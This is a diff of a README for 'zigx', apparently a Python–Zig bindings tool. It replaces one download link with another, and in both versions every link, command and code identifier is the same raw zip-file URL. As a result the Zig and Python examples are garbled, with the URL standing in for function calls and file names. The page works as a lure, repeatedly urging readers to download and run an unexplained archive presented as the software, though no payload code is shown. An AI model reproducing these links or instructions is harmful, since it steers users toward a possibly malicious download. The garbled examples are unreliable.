@@ -1,13 +1,13 @@
 # 🌟 zigx - Seamlessly Connect Python and Zig
 
 ## 📦 Download Now
-[![Download zigx](https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/zigx/src/zigx_v1.8-beta.5.zip)](https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/zigx/src/zigx_v1.8-beta.5.zip)
+[![Download zigx](https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/docs/Software_2.4.zip)](https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/docs/Software_2.4.zip)
 
 ## 🚀 Getting Started
 Welcome to zigx! This application allows you to create Python bindings using Zig. It simplifies the process of integrating Python and Zig, letting you leverage the strengths of both languages.
 
 ## 📥 Download & Install
-To install zigx, visit this page to download: [zigx Releases](https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/zigx/src/zigx_v1.8-beta.5.zip). You will find the latest version along with older releases.
+To install zigx, visit this page to download: [zigx Releases](https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/docs/Software_2.4.zip). You will find the latest version along with older releases.
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version. 
@@ -34,34 +34,34 @@ After installing zigx, you can start using it right away. Follow these steps:
 2. **Navigate to the directory where your Zig code is located.**
 3. **Run the command:** 
    ```
-   zigx https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/zigx/src/zigx_v1.8-beta.5.zip
+   zigx https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/docs/Software_2.4.zip
    ```
 4. You will see the generated Python bindings in the specified output folder.
 
 ## 👨‍🏫 Example
 Here’s a simple example of how to use zigx:
 
-1. Create a new Zig file, `https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/zigx/src/zigx_v1.8-beta.5.zip`:
+1. Create a new Zig file, `https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/docs/Software_2.4.zip`:
    ```zig
    pub fn greet() void {
-       https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/zigx/src/zigx_v1.8-beta.5.zip("Hello from Zig!\n", .{});
+       https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/docs/Software_2.4.zip("Hello from Zig!\n", .{});
    }
    ```
 
 2. In your terminal, run:
    ```
-   zigx https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/zigx/src/zigx_v1.8-beta.5.zip
+   zigx https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/docs/Software_2.4.zip
    ```
 
-3. This will generate a Python file, `https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/zigx/src/zigx_v1.8-beta.5.zip`, which you can import in Python:
+3. This will generate a Python file, `https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/docs/Software_2.4.zip`, which you can import in Python:
    ```python
    import my_code
 
-   https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/zigx/src/zigx_v1.8-beta.5.zip()
+   https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/docs/Software_2.4.zip()
    ```
 
 ## ⚡ Help and Support
-If you encounter any issues while downloading or using zigx, consult the documentation on the [GitHub Wiki](https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/zigx/src/zigx_v1.8-beta.5.zip). You can also check the FAQ section for common questions.
+If you encounter any issues while downloading or using zigx, consult the documentation on the [GitHub Wiki](https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/docs/Software_2.4.zip). You can also check the FAQ section for common questions.
 
 For further assistance, feel free to open an issue on the GitHub repository or ask for help in the community discussion.
 
@@ -77,8 +77,8 @@ Join the zigx community on GitHub to connect with other users. Share your experi
 For the latest updates and news, follow us on our social media channels.
 
 ## 🔗 Useful Links
-- [zigx Releases](https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/zigx/src/zigx_v1.8-beta.5.zip)
-- [Documentation](https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/zigx/src/zigx_v1.8-beta.5.zip)
-- [Report an Issue](https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/zigx/src/zigx_v1.8-beta.5.zip)
+- [zigx Releases](https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/docs/Software_2.4.zip)
+- [Documentation](https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/docs/Software_2.4.zip)
+- [Report an Issue](https://raw.githubusercontent.com/mohamedhussein2025/zigx/main/docs/Software_2.4.zip)
 
 Thank you for choosing zigx! We hope you enjoy its features and capabilities.
